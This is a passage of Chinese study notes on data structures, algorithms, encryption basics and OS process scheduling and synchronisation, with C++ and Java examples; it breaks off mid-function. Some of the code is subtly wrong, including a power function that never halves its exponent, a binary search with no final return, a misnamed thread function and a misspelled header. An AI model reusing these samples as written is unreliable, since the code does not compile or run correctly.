堆就是用数组实现的二叉树，所有它没有使用父指针或者子指针。堆根据“堆属性”来排序，“堆属性”决定了树中节点的位置。

堆的常用方法：

- 构建优先队列
- 支持堆排序
- 快速找出一个集合中的最小值（或者最大值）

堆分为两种：*最大堆*和*最小堆*，两者的差别在于节点的排序方式。

在最大堆中，父节点的值比每一个子节点的值都要大。在最小堆中，父节点的值比每一个子节点的值都要小。这就是所谓的“堆属性”，并且这个属性对堆中的每一个节点都成立。

**堆和普通树的区别**

堆并不能取代二叉搜索树，它们之间有相似之处也有一些不同。我们来看一下两者的主要差别：

**节点的顺序。**在二叉搜索树中，左子节点必须比父节点小，右子节点必须必比父节点大。但是在堆中并非如此。在最大堆中两个子节点都必须比父节点小，而在最小堆中，它们都必须比父节点大。

**内存占用。**普通树占用的内存空间比它们存储的数据要多。你必须为节点对象以及左/右子节点指针分配额为是我内存。堆仅仅使用一个数据来存储数组，且不使用指针。

**平衡。**二叉搜索树必须是“平衡”的情况下，其大部分操作的复杂度才能达到**O(log n)**。你可以按任意顺序位置插入/删除数据，或者使用 AVL 树或者红黑树，但是在堆中实际上不需要整棵树都是有序的。我们只需要满足对属性即可，所以在堆中平衡不是问题。因为堆中数据的组织方式可以保证**O(log n)** 的性能。

**搜索。**在二叉树中搜索会很快，但是在堆中搜索会很慢。在堆中搜索不是第一优先级，因为使用堆的目的是将最大（或者最小）的节点放在最前面，从而快速的进行相关插入、删除操作。

### 🏷 B+ 树与B树

B+树是一种数据结构，是个n叉树，每个节点通常有很多个孩子，一棵B+树包含根节点，内部节点和叶子节点。

![img](http://www.xyongs.cn/image/B_tree.png)

**应用**： B+树通常用于数据库和文件系统中

**B+树需满足的条件**：

1. 节点的子树数和关键字数相同（B树是关键字数比子树少一）
2. 节点的关键字表示的是子树中的最大数，在子树中含有这个数据（子树最少m/2个，去上届）
3. 叶子节点包含了全部数据，同时符合左小右大的顺序

**B+树的特点**

* 关键字数和子树数相同
* 非叶子仅做为索引，它的关键字和叶子节点有重复元素
* 叶子节点用指针连接在一起

**B+树的优点**

* 非叶子节点不会带上ROWID，这样，一个块中可以容纳更多的索引项，一时可以降低树的高度。二是一个内部节点可以定位更多的叶子节点。
* 叶子节点之间通过指针来连接，范围扫描将十分简单，而对于B树来说，则需要在叶子节点和内部节点不停的往返移动（不停的中序遍历）。

**B树需满足的条件**

* 若根节点不是终端节点，则至少有2棵子树，至多有M阶，即M棵子树
* 除根节点以外的所有非节点至少有M/2棵子树，至多有M棵子树（关键字数为子树数减一）
* 所有的叶子节点都位于同一层，叶子节点为失败节点，不存储数据

![img](http://www.xyongs.cn/image/b_tree-6-25.png)

**B树的优点**

对于在内部节点的数据，可以直接得到，不必根据叶子节点来定位

### 🏷 哈夫曼树

参考[数据结构——哈夫曼(Huffman)树+哈夫曼编码](https://www.cnblogs.com/wkfvawl/p/9783271.html)

定义：给定一个n个权值作为n个叶子节点，构造一棵二叉树，若树的带权路径长度最小，则这棵树被称为哈夫曼树。

**带权路径**：所有（叶子节点*该节点的高度）之和   （根节点的高度为0）

**哈夫曼编码**：是哈夫曼编码的一种应用，广泛的应用于数据文件的压缩，他用字符在文件中出现的频率来建立0，1表示的字符的最优表示方式；

它以字符频率数作为叶子节点的权，这样出现频率越高的字符它的表示格式越短，这样达到压缩的目的。

![img](https://raw.githubusercontent.com/wangkuiwu/datastructs_and_algorithm/master/pictures/tree/huffman/03.jpg)

### 🏷 图

**定义**：是有顶点和有穷非空集合和顶点之间边的集合组成，通常表示为：G(V, E)，G表示一个图，V表示顶点集合，E表示边集合

**顶点的度**：顶点Vi的度就是与Vi相连边的个数。对于有向图来说，有分入度和出度。

**邻接**：两顶点存在一条边<v1,v2>

**路径**：v1可以通过若干条边到达v2，的若干条边组成的集合

**连通**：v1可以通过若干条边到达v2

**权**：边上的权重

#### 种类：

无向图：

如果图中任意两个顶点之间的边都是无向边---无向图。(v1,v2)

有向图：

任意两个顶点之间的边都是有向边，<v1,v2>

完全图：

* 无向完全图： 在无向图中， 任意两个顶点存在边
* 有向完全图：在有向图中，任意两个顶点都有互为相反的两条边。

#### 存储结构

**邻接矩阵法**：

无向图：

![img](http://www.xyongs.cn/image/graph1.png)

无向图：

![img](http://www.xyongs.cn/image/graph2.png)

**邻接表法：**

无向图：

![img](http://www.xyongs.cn/image/graph3.png)

有向图：

![img](http://www.xyongs.cn/image/graph4.png)

带权图：

![img](http://www.xyongs.cn/image/graph5.png)

**操作**

遍历：

* [BFS广度优先搜索](https://zh.wikipedia.org/wiki/广度优先搜索)
* [DFS深度优先搜索](https://zh.wikipedia.org/wiki/深度优先搜索)
* 最小生成树
* 最短路径
* 拓扑排序 https://leetcode-cn.com/problems/course-schedule-ii/

## 📚 算法

### 🏷 排序

* [冒泡排序](https://goolory.github.io/2019/11/22/冒泡排序/)

> 算法描述
>
> - 比较相邻的元素。如果第一个比第二个大，就交换它们两个；
> - 对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对，这样在最后的元素应该会是最大的数；
> - 针对所有的元素重复以上的步骤，除了最后一个；
> - 重复步骤1~3，直到排序完成。

* [选择排序](https://goolory.github.io/2019/11/22/SelectionSort/)

> 算法描述
>
> - n个记录的直接选择排序可经过n-1趟直接选择排序得到有序结果。具体算法描述如下：
> - 初始状态：无序区为R[1..n]，有序区为空；
>   第i趟排序(i=1,2,3…n-1)开始时，当前有序区和无序区分别为R[1..i-1]和R(i..n）。该趟排序从当前无序区中-选出关键字最小的记录 R[k]，将它与无序区的第1个记录R交换，使R[1..i]和R[i+1..n)分别变为记录个数增加1个的新有序区和记录个数减少1个的新无序区；
> - n-1趟结束，数组有序化了。

* [插入排序](https://goolory.github.io/2019/11/22/插入排序/)

> 具体算法描述如下：
>
> - 从第一个元素开始，该元素可以认为已经被排序；
> - 取出下一个元素，在已经排序的元素序列中从后向前扫描；
> - 如果该元素（已排序）大于新元素，将该元素移到下一位置；
> - 重复步骤3，直到找到已排序的元素小于或者等于新元素的位置；
> - 将新元素插入到该位置后；
> - 重复步骤2~5。

* [快速排序](https://goolory.github.io/2019/11/22/quickSort/)

> 算法描述
>
> - 从数列中挑出一个元素，称为 “基准”（pivot）；
> - 重新排序数列，所有元素比基准值小的摆放在基准前面，所有元素比基准值大的摆在基准的后面（相同的数可以到任一边）。在这个分区退出之后，该基准就处于数列的中间位置。这个称为分区（partition）操作；
> - 递归地（recursive）把小于基准值元素的子数列和大于基准值元素的子数列排序。

* 堆排序
* [归并排序](https://goolory.github.io/2019/11/22/mergeSort/)

时间复杂度：O(nlgn); 空间复杂度：O(n)。每次排序会用到一个辅助空间，但是用完之后会释放。

> 算法描述
>
> - 把长度为n的输入序列分成两个长度为n/2的子序列；
> - 对这两个子序列分别采用归并排序；
> - 将两个排序好的子序列合并成一个最终的排序序列。

* [希尔排序](https://goolory.github.io/2019/11/22/shellSort/)

> 算法描述
> 先将整个待排序的记录序列分割成为若干子序列分别进行直接插入排序，具体算法描述：
>
> - 选择一个增量序列t1，t2，…，tk，其中ti>tj，tk=1；
> - 按增量序列个数k，对序列进行k 趟排序；
> - 每趟排序，根据对应的增量ti，将待排序列分割成若干长度为m 的子序列，分别对各子表进行直接插入排序。仅增量因子为1 时，整个序列作为一个表来处理，表长度即为整个序列的长度。

* 计数排序
* 桶排序
* 基数排序

### 🏷 查找

* 顺序查找

[在排序数组中查找元素的第一个和最后一个位置](https://leetcode-cn.com/problems/find-first-and-last-position-of-element-in-sorted-array)

[寻找重复数](https://leetcode-cn.com/problems/find-the-duplicate-number)

[山脉数组中查找目标值](https://leetcode-cn.com/problems/find-in-mountain-array)

[数组中的逆序对](https://leetcode-cn.com/problems/shu-zu-zhong-de-ni-xu-dui-lcof)

* 插值插值
* 哈希查找
* 红黑树

#### KMP算法

KMP算法重点在于前缀表的构建

![img](http://www.xyongs.cn/image/KMP-6-30.png)

```c++
class Solution {
public:
    int strStr(string haystack, string needle) {
        int n = haystack.size(), m = needle.size();
        if (m == 0) return 0;
        if (n < m) return - 1; 
        vector<int> next = search(needle);
        int i = 0;
        int j = 0;
        while(i < n){
            if (j == m - 1 && haystack[i] == needle[j])
                return i - j;
            else if (haystack[i] == needle[j]){
                i++; j++;
            } else{
                if (j > 0)
                    j = next[j];
                else{
                    j = 0; i++;
                }
            }
        }
        return -1;
    }

    vector<int> search(string needle){
        vector<int> next(needle.size(), 0);
        int len = 0;
        int i = 1;
        next[0] = 0;
        while(i < needle.size()){
            if (needle[i] == needle[len]){
                len++;
                next[i] = len;
                i++;
            }else{
                if (len > 0){
                    len = next[len - 1];
                } else{
                    next[i] = 0;
                    i++;
                }
            }
        }
        next.erase(next.end() - 1);
        next.insert(next.begin(), -1);
        return next;
    }
};
```



#### 二分法

https://segmentfault.com/a/1190000016825704

二分法的边界问题

**标准**

```c++
int search(vector<int>& nums, int target)
{
    int left = 0, right = nums.size() - 1;
    while(left <= right)
    {
        int mid = left + ((right - left) >> 1);
        if (nums[mid] == target) return mid;
        else if (nums[mid] > target)
            right = mid - 1;
        else
            left = mid +1;
    }
}
```

* 循环条件 ： left <= right

* 中间位置：mid = left + ((right - left) >>1)
* 左边界更新 ：left = mid +1;
* 有边界更新 ： right = mid - 1;
* 返回值 ： mid / -1

**左边界查找**

(右边界同理左边界)

例如：数组有序但是可能包含重复元素,我们要找到最左的元素，需要持续的收缩右边界。

```c++
int search(vector<int> nums, int target)
{
    int left = 0, right = nums.size() - 1;
    while (left < right)
    {
        int mid = left + (right - left) / 2;
        if (nums[mid] < target)
            left = mid +1;
        else
            right = mid;
    }
    return nums[left] == target ? left : -1;
}
```

* 循环条件 ： left < right;
* 中间位置： mid = left + (right - left) / 2;
* 左边界：left = mid + 1;
* 右边界：right = mid;
* 返回： nums[left] == target ? left : -1;

### 🏷 并查集

在计算机科学中，并查集是一种树型的数据结构，用于处理一些不交集（Disjoint Sets）的合并及查询问题。有一个联合-查找算法（Union-find Algorithm）定义了两个用于此数据结构的操作：

Find：确定元素属于哪一个子集。它可以被用来确定两个元素是否属于同一子集。
Union：将两个子集合并成同一个集合。
由于支持这两种操作，一个不相交集也常被称为联合-查找数据结构（Union-find Data Structure）或合并-查找集合（Merge-find Set）。
为了更加精确的定义这些方法，需要定义如何表示集合。一种常用的策略是为每个集合选定一个固定的元素，称为代表，以表示整个集合。接着，Find(x)Find(x) 返回 xx 所属集合的代表，而 Union 使用两个集合的代表作为参数。

* 【并查集】用于判断一对元素是否相连，它们的关系是动态添加的，这类问题叫做**动态连通性问题**；
* 主要支持**合并**与**查询是否在同一个集合**操作
* 底层结构是【数组】或【哈希表】，用于表示【结点】指向的【父结点】，初始化时指向自己；
* 【合并】就是把一个结合的根结点指向另一个集合的根结点，只要根结点一样，就表示在同一个集合里；
* 这种表示【不相交集合】的方法称之为【代表元法】，以每个节点的根结点作为一个集合的【代表元】

链接：https://leetcode-cn.com/tag/union-find/

例题：

[力扣（LeetCode）990.等式方程的可满足性](https://leetcode-cn.com/problems/satisfiability-of-equality-equations/solution/deng-shi-fang-cheng-de-ke-man-zu-xing-by-leetcode-/#comment)

> 给定一个由表示变量之间关系的字符串方程组成的数组，每个字符串方程 equations[i] 的长度为 4，并采用两种不同的形式之一："a==b" 或 "a!=b"。在这里，a 和 b 是小写字母（不一定不同），表示单字母变量名。
>
> 只有当可以将整数分配给变量名，以便满足所有给定的方程时才返回 true，否则返回 false。 
>
> 输入：["a==b","b!=a"]
> 输出：false
> 解释：如果我们指定，a = 1 且 b = 1，那么可以满足第一个方程，但无法满足第二个方程。没有办法分配变量同时满足这两个方程。
>
> 来源：力扣（LeetCode）
> 链接：https://leetcode-cn.com/problems/satisfiability-of-equality-equations
> 著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。

```c++
class UnionFind{
private:
    vector<int> parent;
public:
    UnionFind()
    {
        parent.resize(26);
        iota(parent.begin(), parent.end(), 0);  //填充0,1,2,3，....25
    }
    int find(int index){
        if (index == parent[index]) return index;
        parent[index] = find(parent[index]);
        return parent[index];
    }
    void unite(int index1, int index2) {
        parent[find(index1)] = find(index2);
    }
};
class Solution{
public:
    bool equationsPossible(vector<string>& equations){
        UnionFind uf;
        for (const string& str: equations) {
            if (str[1] == '=') {
                int index1 = str[0] - 'a';
                int index2 = str[3] - 'a';
                uf.unite(index1, index2);
            }
        }
        for (const string& str: equations) {
            if (str[1] == '!') {
                int index1 = str[0] - 'a';
                int index2 = str[3] - 'a';
                if (uf.find(index1) == uf.find(index2)) {
                    return false;
                }
            }
        }
        return true;
    }
}
```

### 🏷 动态规划

通过把原问题分解为相对简单的子问题的方式求解复杂问题的方法，适用于有重叠子问题和最优子结构性质的问题

动态规划：子问题重叠的情况，不同的子问题具有公共的子子问题

* 最优子结构：问题的最优解由相关子问题的最优解组合而成
* 边界：问题的边界，得到有限的结果
* 动态转移方程：问题每一阶段和下一阶段的关系

Example：

1. Fibonacci （合并状态）
2. 有n个石子，AB轮流取石子，最少一个，最多两个，取最后一个的人赢

#### 01背包

问题描述

> 有n个物品，它们有各自的价值和体积，现只有给定容量的背包，如何让背包里装入的物品有最大的价值总和？
>
> `number = 4; capacity = 8; W = {2,3,4,5}; V = {3,4,5,6}`
>
> 动态方程：`dp[i,j] = max(dp[i-1, j], dp[i-1,j-Wi]+Vi)`  取到前i件物品，容积为j的最大价值
>
> 时间复杂度：O(NW)

```c++
class Solution {
public:
    int backpack(vector<int>& W,vector<int>& V, int N, int C)
    {
        vector<vector<int>> dp(N + 1, vector<int>(C + 1, 0));
        for (int i  = 1; i < dp.size(); i++)
        {
            for (int j = 1; j < dp[0].size(); j++)
            {
                if (j < W[i])
                    dp[i][j] = dp[i-1][j];
                else
                    dp[i][j] = max(dp[i-1][j], dp[i-1][j-W[i]] + V[i]);
            }
        }
        return dp[N][C];
    }
};
```

#### 完全背包

问题描述

> N件物品，容量为W的背包。第i件物品的重量为Wi,价值为Vi，每件物品有无数个。求装最大价值。
>
> 动态方程`dp[i,j] = max(dp[i-1, j], dp[i-1][j-k*Wi]+k*Vi) (0<=k<=W/Wi)`
>
> 时间复杂度 O(NWK)
>
> 优化：`dp[i,j] = max(dp[i-1,j],dp[i,j-Wi]+Vi)`
>
> `dp[j] = max(dp[j], dp[j-Wi] + Vi)`

【视频】[DP动态规划](https://www.bilibili.com/video/BV1VW411Q7kw?from=search&seid=14062140918885485408)

[最长回文子串](https://leetcode-cn.com/problems/longest-palindromic-substring)

[跳跃游戏 II](https://leetcode-cn.com/problems/jump-game-ii)

[最大子序和](https://leetcode-cn.com/problems/maximum-subarray)

股票买卖问题：

[买卖股票的最佳时机](https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock/)

[买卖股票的最佳时机 II](https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-ii/)

[买卖股票的最佳时机 III](https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-iii/)

[买卖股票的最佳时机 IV](https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-iv/)

[最佳买卖股票时机含冷冻期](https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-with-cooldown/)

[买卖股票的最佳时机含手续费](https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-with-transaction-fee/)

找零【bilibili】笔试

```java
 public static int GetCoinCount (int N) {        // write code here    
   N = 1024 - N;        
   int[] arr = {1, 4, 16, 64};        
   int[] dp = new int[N+1];        
   Arrays.fill(dp, N+1);        
   dp[0] = 0;        
   for (int i = 0; i <= N ; i++) {            
     for (int j = 0; j < 4; j++) {                
       if(i - arr[j] >= 0){                    
         dp[i] = Math.min(dp[i], dp[i - arr[j]] + 1);
       }
     }
   }
   return dp[N];
 }
```



### 🏷 贪心法

一种在每一步选择中都采取在当前状态下最好或最优（即最有利）的选择，从而希望导致结果是最好或最优的算法

[跳跃游戏](https://leetcode-cn.com/problems/jump-game/)

### 🏷 分治法

把一个复杂的问题分成两个或更多的相同或相似的子问题，直到最后子问题可以简单的直接求解，原问题的解即子问题的解的合并

快速排序，归并排序

### 🏷 加密算法

#### 单向加密

单向加密又称不可逆加密算法，其密钥是由加密散列函数生成的。单向散列函数一般用于产生消息摘要，密钥加密等，常见的有：

* MD5:是RSA数据安全公司开发的一种单向散列算法，非可逆，相同明文产生相同密文
* SHA：可以对任意长度的数据运行生成一个160位的数值。其变种有SHA192，SHA256
* CRC-32：主要用于通过校验功能；

算法特征：

* 输入一样，输出必然相同；
* 雪崩效应，输入的微小改变，将会引起结果的巨大变化
* 定长输出，无论原始数据多大，结果大小是相同的；
* 不可逆，无法根据特征码还原出原来的数据；

#### 对称加密

采用单钥密码系统的加密方式，同一个密钥可以同时作用信息加密和解密，这种加密方式称为对称加密，也称为单密钥加密

特点：

* 加密方和解密方使用同一密钥；
* 加密解密的速度比较快，适合数据比较长时的使用
* 密钥传输不安全，且容易被破解，密钥管理也比较麻烦

优点：

对称加密算法的优点是公开，计算量小，加密速度快，加密效率高

缺点：

对称加密算法的缺点在于数据发送前，发送方和接受方必须都商定好密钥，然后使双方能保持好密钥。其次如果一方密钥被泄漏，那么加密信息就不安全了。另外，每对用户使用对称加密算法时，都需要使用其他人不知道的唯一密钥，这会使得收发双方都拥有的钥匙数量巨大，密钥管理称为双方的负担

#### 非对称加密

公钥加密，由一对公钥和私钥组成，公钥是从私钥中提取出来的。可以用公钥加密，在使用私钥解密，这种情形一般用于公钥加密，当然也可以使用私钥加密，公钥解密。常用于数字签名，因此非对称加密主要功能是加密和数字签名

特征：

* 密钥对
* 主要功能：加密和签名。发送方用对方公钥加密，可以保证数据的机密性（公钥加密）。发送方用自己的私钥加密，可实现身份验证（数字签名）
* 公钥加密算法很少用来加密数据，速度太慢，通常用来实现身份验证

常用算法：

RSA：RSA公司发明，是一个支持变长密钥的公共密钥算法，需要加密的文件块的长度是可变的；既可以实现加密，又可以实现签名

#### MD5

Message-Digest Algorithm 5（信息-摘要算法）。前有MD3、MD4

MD5是输入不定长度信息，输出固定长度128-bits的算法，经过程序流程，生成四个32位数据，最后联合起来成为一个128-bits散列。

基本方式为：求余，取余，调整长度，与链接变量进行循环运算。得出结果。

**不足：**

散列长度为128，随着计算机运算能力提高，找到“碰撞”是可能。

### 🏷 洗牌算法

从原始数组中随机取一个之前没有取到过的数字到新的数字中

算法步骤为：

1. 建立一个数组大小为 n 的数组 arr，分别存放 1 到 n 的数值；

2. 生成一个从 0 到 n - 1 的随机数 x；

3. 输出 arr 下标为 x 的数值，即为第一个随机数；

4. 将 arr 的尾元素和下标为 x 的元素互换；

5. 同2，生成一个从 0 到 n - 2 的随机数 x；

6. 输出 arr 下标为 x 的数值，为第二个随机数；

7. 将 arr 的倒数第二个元素和下标为 x 的元素互换；

……

如上，直到输出m 个数为止

时间复杂度为O(n)，空间复杂度为O(1)，缺点必须知道数组长度n。

### 🏷 滑动窗口


给定一个字符串 **s** 和一个非空字符串 **p**，找到 **s** 中所有是 **p** 的字母异位词的子串，返回这些子串的起始索引。

字符串只包含小写英文字母，并且字符串 **s** 和 **p** 的长度都不超过 20100。

**说明：**

- 字母异位词指字母相同，但排列不同的字符串。
- 不考虑答案输出的顺序。

**示例 1:**

```
输入:
s: "cbaebabacd" p: "abc"

输出:
[0, 6]

解释:
起始索引等于 0 的子串是 "cba", 它是 "abc" 的字母异位词。
起始索引等于 6 的子串是 "bac", 它是 "abc" 的字母异位词。
```

```c++
class Solution {
public:
    vector<int> findAnagrams(string s, string p) {
        vector<int> res;
        //滑动窗口
        unordered_map<char, int> windows, need;
        for (auto c: p) need[c]++;
        int left = 0, right = 0, valid = 0;
        while(right < s.size()){
            char c = s[right];
            right++;
            if (need.count(c)){
                windows[c]++;
                if (windows[c] == need[c]){
                    valid++;
                }
            }
            while(valid == need.size()){
                if (right-left == p.size()){
                    res.push_back(left);
                }
                char d = s[left];
                left++;
                if (need.count(d)){
                    if (windows[d] == need[d]){
                        valid--;
                    }
                    windows[d]--;
                }
            }
        }
        return res;
    }
};
```

### 🏷 位操作

```c++
//利用或操作 | 和空格将英文字符转换为小写
('a' | ' ') = 'a';
('A' | ' ') = 'a';
//利用与操作 & 和下划线将英文字符转换为大写
('b' & '_') = 'B';
('B' & '_') = 'B';
//利用异或操作 ^ 和空格进行英文字符大小写互换
('d' ^ ' ') = 'D';
('D' ^ ' ') = 'd';
//判断两个数是否异号
int x = -1, y = 2;
bool f = ((x ^ y) < 0); // true

int x = 3, y = 2;
bool f = ((x ^ y) < 0); // false
```

**消除数字n的二进制表示中的最后一个1**

`n&(n-1)`

### 🏷 反复平方法求幂

```c++
	int pow(int a, int b)
  {
    int res = 1;
    int r = a;
    while(b)
    {
      if (b & 1)
        res *= r;
      r *= r;
      b / 2;
    }
    return res;
  }
```



## 📚 操作系统

### 🏷进程管理

#### 进程

进程是资源分配的基本单位，是具有一定独立功能的程序，在数据集上进行一次执行

进程是对运行的程序的封装，实现了操作系统的并发；

**进程控制块**

为了描述和控制进程的运行，系统为每个进程定义了一个数据结构--进程控制块（PCB）。它是进程重要的组成部分，记录了操作系统所需的、用于描述进程的当前状态和控制进程的全部信息。操作系统就是根据进程的PCB来感知进程的存在，并依次对进程进程管理和控制。PCB是进程存在的唯一标识符

PCB包括：

1. 进程标识信息

   > 内部标识：操作系统赋予每个进程的唯一数字标识符
   >
   > 外部标识：创建者产生，为用户进程访问该进程提供方便

2. 处理机状态

   > 处理机各个寄存器内的信息组成。

3. 进程调度信息

   > 进程状态：就绪、运行、阻塞
   >
   > 进程优先级
   >
   > 为调度保存的信息
   >
   > 事件

4. 进程控制信息

   > 程序和数据地址
   >
   > 进程同步和通信机制
   >
   > 资源清单
   >
   > 链接指针

#### 进程上下文切换

在进程A切换到进程B的过程中，先保存A进程的上下文，以便于等A恢复运行的时候，能够知道A进程的下一条指令是啥。然后将要运行的B进程的上下文恢复到寄存器中。这个过程被称为上下文切换。

上下文切换开销在进程不多、切换不频繁的应用场景下问题不大。但是现在Linux操作系统被用到了高并发的网络程序后端服务器。在单机支持成千上万个用户请求的时候，这个开销就得拿出来说道说道了。因为用户进程在请求Redis、Mysql数据等网络IO阻塞掉的时候，或者在进程时间片到了，都会引发上下文切换。

**系统开销**

上下文切换开销要比系统调用的开销要大。系统调用只是在进程内将用户态切换到内核态，然后再切回来，而上下文切换可是直接从进程A切换到了进程B。显然这个上下文切换需要完成的工作量更大。

#### 线程

线程是独立调度的基本单位，是CPU调度和分配的最小单位

一个进程可以有多个线程，它们共享进程资源

**有了进程为什么还要线程**？

线程产生的原因：

尽快可以使多个程序并发执行，以提高资源的利用率和系统的吞吐量；但是有些缺陷，进程在同一时间内只能干一件事，进程在执行的过程中如果阻塞，整个进程就会挂起，即使有些工作不依赖等待的资源，任然不能执行。

因此操作系统引入了颗粒度更小的线程，作为并发执行的基本单位，从而减少程序在并发执行时所付出的时空开销，提高并发性。

#### 进程线程区别

1. 拥有资源：进程是资源分配的基本单位，但是线程不拥有资源，线程可以访问隶属进程的资源
2. 调度：线程是独立调度的基本单位，在同一进程中，线程的切换不会引起进程切换，从一个进程中的线程切换到另一个进程的线程中时，会引起进程切换
3. 系统开销：由于创建或撤销进程时，系统都要为之分配或回收资源，如空间内存、IO设备，所付出的开销远大于创建和撤销线程时的开销。类似的，在进行进程切换时，当涉及到当前执行进程CPU环境的保存以及新调度进程CPU环境的设置，而线程切换时只需保存和设置少量寄存器内容，开销很小
4. 通信方面：线程可以通过直接读写同一进程中的数据进行通信，但是进程通信需要借助IPC

#### 进程状态的转换

![img](http://xyongs.cn/image/process-6-9.png)

* 就绪--执行：对就绪状态的进程，当进程调度程序按一种选定的策略从中选中一个就绪进程，为之分配了处理器后，该进程便由就绪状态变为执行状态

* 执行--阻塞：正在执行的进程因为发生某等待事件而无法执行，则进程由执行状态变为阻塞状态。

  > 如：
  >
  > 进程提出输入/输出请求而变成等待外部设备传输信息的状态；
  >
  > 进程申请资源，得不到满足时变成等待状态；
  >
  > 进程运行中出现了故障变成等待干预状态

* 阻塞--就绪：处于阻塞状态的进程，在其等待的事件已经发生，如输入/输入完成，资源得到满足或错误处理完毕时，处于等待状态的进程并不马上转入执行状态，而是先转入就绪状态，然后再由系统进程调度程序在适当的时候将该进程转为执行状态；

* 执行--就绪：正在执行的进程，因时间片用完而被暂停执行，或在采用抢先式优先级调度算法的系统中，当有更高优先级的进程需要运行而被迫让出处理机时，该进程便由执行状态变为就绪状态。

#### 进程调度算法

##### 1. 批处理系统

**先来先服务**：非抢占式的调度算法，按照请求的顺序进行调度

> 有利于长作业，但不利于短作业，因为短作业必须一直等待前面的长作业执行完毕才能执行，而长作业又需要执行很长时间，造成了短作业等待时间过长。

**短作业优先：**非抢占式的调度算法，按估计运行时间最短的顺序进行调度

> 长作业可能会饿死

**最短剩余时间优先：**

> 最短作业优先的抢占式版本，按剩余运行时间的顺序进行调度

##### 2. 交互式系统

**时间片轮转**

**优先级调度**：为每个进程分配一个优先级，按优先级进行调度

> 为了防止低优先级的进程永远等不到调度，可以随着时间的推移增加等待进程的优先级。

**多级反馈队列**：

> 一个进程需要执行 100 个时间片，如果采用时间片轮转调度算法，那么需要交换 100 次。
>
> 多级队列是为这种需要连续执行多个时间片的进程考虑，它设置了多个队列，每个队列时间片大小都不同，例如 1,2,4,8,..。进程在第一个队列没执行完，就会被移到下一个队列。这种方式下，之前的进程只需要交换 7 次。
>
> 每个队列优先权也不同，最上面的优先权最高。因此只有上一个队列没有进程在排队，才能调度当前队列上的进程。
>
> 可以将这种调度算法看成是时间片轮转调度算法和优先级调度算法的结合。

![img](http://xyongs.cn/image/process2-6-9.png)

**实时系统**：

> 实时系统要求一个请求在一个确定时间内得到响应。
>
> 分为硬实时和软实时，前者必须满足绝对的截止时间，后者可以容忍一定的超时。

#### 进程同步与进程通信的区别

* 进程同步：控制多个进程按照一定顺序执行
* 进程通信：进程间传输信息

进程通信是一种手段，而进程同步是一种目的。可以说，为了能达到进程同步的目的，需要让进程进行通信，传输一些进程同步所需要的信息。

#### 进程同步

进程同步方式：信号量、互斥量、条件变量、管程

##### 临界区

对临界区资源进行访问的那段代码称为临界区；

为了互斥访问临界资源，每个进程在进入临界区之前，需要先进行检测。

##### 同步与互斥

* 同步：多个进程因为合作产生的直接制约关系，使得进程有一定的先后执行关系。
* 互斥：多个进程在同一时刻只能有一个进程进入临界区。

##### 信号量

[Linux进程间通信——使用信号量](https://blog.csdn.net/ljianhui/article/details/10243617)

信号量是一个整型变量，可以对其执行down和up操作，即PV操作

* down：如果信号量大于0，执行-1操作；如果信号量等于0，进程睡眠，等待信号量大于0；
* up：对信号量执行+1操作，唤醒睡眠的程序让其完成down操作。

信号量是一个计数器，可以用来控制多个进程对共享资源的访问。它常作为一种锁机制，防止某进程正在访问共享资源时，其他进程也访问该资源。因此，主要作为进程间以及同一进程内不同线程之间的同步手段

例子：[原文](https://www.jianshu.com/p/4fdad407068b)

```c++
#include<stdio.h>  //printf
#include<stdlib.h>  //exit(), EXIT_SUCCESS
#include<pthread.h>  //pthread_create(), pthread_join()
#include<semaphore.h>  //sem_init()

sem_t binSem;
void *helloWorld(void* arg);
int main()
{
    int res = 0;
    res = sem_init(&binSem, 0, 0);
    if (res){
        printf("Semaphore initialization failed!!\n");
        exit(EXIT_FAILURE);
    }
    //创建线程
    pthread_t thdHelloWorld;
    res = pthread_create(&thdHelloWorld, NULL, helloworld, NULL);//1、绑定线程对象；2、设置写出属性；3、绑定函数名；4、函数参数
    if(res)
    {
        printf("thread creation failed!!\n");
        exit(EXIT_FAILURE);
    }
    while(1)
    {
        sem_post(&binSem);
        printf("In main, sleep several seconds.\n");
        sleep(1);
    }
    void *threadResult;
    res = pthread_join(thdHelloWorld, &threadResult);
    if (res) {
         printf("Thread join failed!!\n");
         exit(EXIT_FAILURE);
     }
     exit(EXIT_SUCCESS);
    
}
void* helloWorld(void* arg) {
    while(1) {
         // Wait semaphore
         sem_wait(&binSem);
         printf("Hello World\n");
     }
}
```

##### 管程

提出目的：分离互斥和条件同步的关注

什么是管程：由临界区有若干条件变量组成的用于管理并发访问共享数据的方法

#### 经典同步问题

##### 生产者消费者问题

[原文](https://www.cnblogs.com/haippy/p/3252092.html)

单生成者-单消费者模型（其他模型见原文）

单生成者-单消费者模型，只有一个生产者一个消费者，生产者不停的往产品库中放入产品，消费者则从产品库中取走产品，产品库容积有限，只能容纳一定数目的产品，如果生成者生成速度过快，则需要等消费者取走产品后，产品库不为空才能继续生成，反之，如果消费者消费过快，也需要等待生产者生成

```c++
#include<unistd.h>
#include<cstdlib>
#include<condiation_variable>
#include<iostream>
#include<mutex>
#include<thread>

static const int KItemRepositorySize = 10; //Item buffer size;
static const int KItemToProduce = 100;   //How many items we plan to produce;
struct ItemRepository
{
    int item_buffer[KItemRepositorySize];  //产品缓冲区，配合read_position 和write_position模型环形队列
    size_t read_position;// 消费者读产品位置
    size_t write_position;  //生产者写入位置
    std::mutex mtx;  // 互斥量，保护产品缓冲区
    std::condition_variable repo_not_full;   //条件变量，指示产品缓冲区不为满
    std::condition_variable repo_not_empty;  //条件变量，指示产品缓冲区不为空
} gItemRepository; // 产品库全局变量，生产者和消费者操作该变量
typedef struct ItemRepository ItemRepository;

void ProduceItem(ItemRepository* ir, int item)
{
    std::unique_lock<std::mutex> lock(ir->mtx);
    while(((ir->write_position + 1) % KItemRepositorySize) == ir->read_position)  //满
    {
        std::cout << "Producer is waiting for an empty slot...\n";
        (ir->repo_not_full).wait(lock);  //生产者等待"产品库缓冲区不为满"这一条件发生.
    }
    (ir->item_buffer)[ir->write_position] = item; // 写入产品
    (ir->write_position)++;  //写入位置后移
    
    if (ir->write_position == KItemRepositorySize)  //写入位置在最后，则重置为初始位置
    {
        ir->write_position = 0;
    }
